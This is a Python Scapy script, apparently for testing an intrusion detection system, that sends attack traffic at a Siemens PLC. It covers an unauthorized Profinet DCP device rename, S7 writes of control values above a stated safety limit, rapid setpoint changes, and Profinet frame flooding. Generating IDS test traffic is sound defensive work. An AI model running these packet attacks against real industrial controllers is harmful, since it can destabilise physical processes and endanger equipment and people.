#!/usr/bin/env python3
"""
Attack Scenarios for HMI
Simulates various attack patterns for IDS testing
"""

from scapy.all import *
import struct
import logging
import time

logging.basicConfig(level=logging.INFO)

class AttackScenarios:
    def __init__(self, plc_ip, plc_name, interface='eth0'):
        self.plc_ip = plc_ip
        self.plc_name = plc_name
        self.interface = interface
        self.mac_address = get_if_hwaddr(interface)
        
        # Get PLC MAC (we'll use broadcast for discovery)
        self.plc_mac = "ff:ff:ff:ff:ff:ff"
        
        self.PROFINET_ETHERTYPE = 0x8892
        
        logging.info(f"Attack module initialized")
        logging.info(f"Target PLC: {plc_name} @ {plc_ip}")
    
    def attack_1_unauthorized_dcp_set_name(self):
        """
        ATTACK 1: Unauthorized DCP Set-Name Request
        Attempts to rename the PLC device without authorization
        """
        logging.warning("="*60)
        logging.warning("ATTACK 1: Unauthorized DCP Set-Name")
        logging.warning("="*60)
        
        new_name = "hacked-plc-malicious"
        
        # Build Profinet DCP Set-Name Request
        eth = Ether(src=self.mac_address, dst=self.plc_mac, type=self.PROFINET_ETHERTYPE)
        
        # Frame ID for DCP Request (0xFEFC)
        frame_id = struct.pack("!H", 0xFEFC)
        
        # Service ID: Set (0x04), Service Type: Request (0x00)
        service_id = struct.pack("!B", 0x04)
        service_type = struct.pack("!B", 0x00)
        
        # Transaction ID
        xid = struct.pack("!I", 0x12345678)
        
        # Reserved
        reserved = struct.pack("!H", 0x0000)
        
        # DCE/RPC Option: NameOfStation (0x02, 0x02)
        option = struct.pack("!BB", 0x02, 0x02)
        length = struct.pack("!H", len(new_name))
        name_data = new_name.encode()
        
        # Padding
        if len(name_data) % 2:
            name_data += b'\x00'
        
        payload = frame_id + service_id + service_type + xid + reserved + option + length + name_data
        
        packet = eth / Raw(load=payload)
        
        logging.warning(f"Sending DCP Set-Name: '{new_name}'")
        logging.warning("This should trigger IDS alert: Unauthorized device renaming")
        
        sendp(packet, iface=self.interface, verbose=False)
        
        logging.warning("Attack packet sent!")
        logging.warning("="*60)
        
        return True
    
    def attack_2_control_value_overwrite(self):
        """
        ATTACK 2: Control Value Overwrite
        Attempts to write dangerous values to PLC control registers
        """
        logging.warning("="*60)
        logging.warning("ATTACK 2: Control Value Overwrite")
        logging.warning("="*60)
        
        # Simulate writing dangerous value (> 75% safety limit)
        dangerous_value = 25000  # ~90% (limit is 20736 = 75%)
        
        logging.warning(f"Attempting to write dangerous control value: {dangerous_value}")
        logging.warning("Target: MW102 (Control Value)")
        logging.warning("Safety Limit: 20736 (75%)")
        logging.warning("Attack Value: 25000 (90%) - EXCEEDS LIMIT")
        
        # Build simple S7 Write Request packet
        eth = Ether(src=self.mac_address, dst=self.plc_mac, type=0x0800)
        ip = IP(src="192.168.100.20", dst=self.plc_ip)
        tcp = TCP(sport=12345, dport=102, flags='PA')
        
        # Simplified S7 write payload (normally this would be COTP + S7)
        # For demonstration, we'll create a recognizable pattern
        s7_write = b'\x03\x00\x00\x1f'  # TPKT Header
        s7_write += b'\x02\xf0\x80'     # COTP Header
        s7_write += b'\x32\x01\x00\x00'  # S7 Header (Write)
        s7_write += b'\x00\x00'          # Parameters
        s7_write += struct.pack("!H", dangerous_value)  # Data
        
        packet = eth / ip / tcp / Raw(load=s7_write)
        
        logging.warning("Sending malicious write command")
        logging.warning("This should trigger IDS alert: Control value out of range")
        
        sendp(packet, iface=self.interface, verbose=False)
        
        logging.warning("Attack packet sent!")
        logging.warning("="*60)
        
        return True
    
    def attack_3_rapid_setpoint_changes(self):
        """
        ATTACK 3: Rapid Setpoint Changes
        Rapidly changes setpoint values to cause instability
        """
        logging.warning("="*60)
        logging.warning("ATTACK 3: Rapid Setpoint Changes")
        logging.warning("="*60)
        
        logging.warning("Sending rapid setpoint changes (5 times in 2 seconds)")
        logging.warning("This can cause process instability")
        
        values = [5000, 20000, 1000, 25000, 10000]
        
        for i, value in enumerate(values):
            logging.warning(f"Change {i+1}/5: Setpoint = {value}")
            
            # Build packet (simplified)
            eth = Ether(src=self.mac_address, dst=self.plc_mac, type=0x0800)
            ip = IP(src="192.168.100.20", dst=self.plc_ip)
            tcp = TCP(sport=12346+i, dport=102, flags='PA')
            
            s7_write = b'\x03\x00\x00\x1f'
            s7_write += b'\x02\xf0\x80'
            s7_write += b'\x32\x01\x00\x00'
            s7_write += struct.pack("!H", value)
            
            packet = eth / ip / tcp / Raw(load=s7_write)
            sendp(packet, iface=self.interface, verbose=False)
            
            time.sleep(0.4)
        
        logging.warning("Attack sequence completed!")
        logging.warning("="*60)
        
        return True
    
    def attack_4_profinet_frame_flooding(self):
        """
        ATTACK 4: Profinet Frame Flooding
        Floods the network with Profinet frames
        """
        logging.warning("="*60)
        logging.warning("ATTACK 4: Profinet Frame Flooding")
        logging.warning("="*60)
        
        logging.warning("Sending 100 Profinet frames rapidly")
        logging.warning("This simulates a DoS attack")
        
        for i in range(100):
            eth = Ether(src=self.mac_address, dst=self.plc_mac, type=self.PROFINET_ETHERTYPE)
            
            frame_id = struct.pack("!H", 0x8000 + i)  # Cyclic data frame
            data = struct.pack("!H", i) + (b'\xAA' * 100)
            
            packet = eth / Raw(load=frame_id + data)
            sendp(packet, iface=self.interface, verbose=False)
            
            if i % 20 == 0:
                logging.warning(f"Sent {i}/100 frames")
        
        logging.warning("Flooding attack completed!")
        logging.warning("="*60)
        
        return True
    
    def run_all_attacks(self, delay=5):
        """Run all attack scenarios with delay between each"""
        attacks = [
            ("Unauthorized DCP Set-Name", self.attack_1_unauthorized_dcp_set_name),
            ("Control Value Overwrite", self.attack_2_control_value_overwrite),
            ("Rapid Setpoint Changes", self.attack_3_rapid_setpoint_changes),
            ("Profinet Frame Flooding", self.attack_4_profinet_frame_flooding),
        ]
        
        logging.info("\n" + "="*60)
        logging.info("ATTACK SIMULATION SUITE")
        logging.info(f"Total attacks: {len(attacks)}")
        logging.info(f"Delay between attacks: {delay}s")
        logging.info("="*60 + "\n")
        
        for idx, (name, attack_func) in enumerate(attacks, 1):
            logging.info(f"\n[{idx}/{len(attacks)}] Preparing: {name}")
            time.sleep(2)
            
            try:
                attack_func()
                logging.info(f"✓ {name} completed\n")
            except Exception as e:
                logging.error(f"✗ {name} failed: {e}\n")
            
            if idx < len(attacks):
                logging.info(f"Waiting {delay}s before next attack...\n")
                time.sleep(delay)
        
        logging.info("\n" + "="*60)
        logging.info("ALL ATTACKS COMPLETED")
        logging.info("Check IDS logs for alerts")
        logging.info("="*60 + "\n")

if __name__ == "__main__":
    # Test mode
    attacker = AttackScenarios("192.168.100.10", "siemens-plc-01")
    attacker.run_all_attacks()
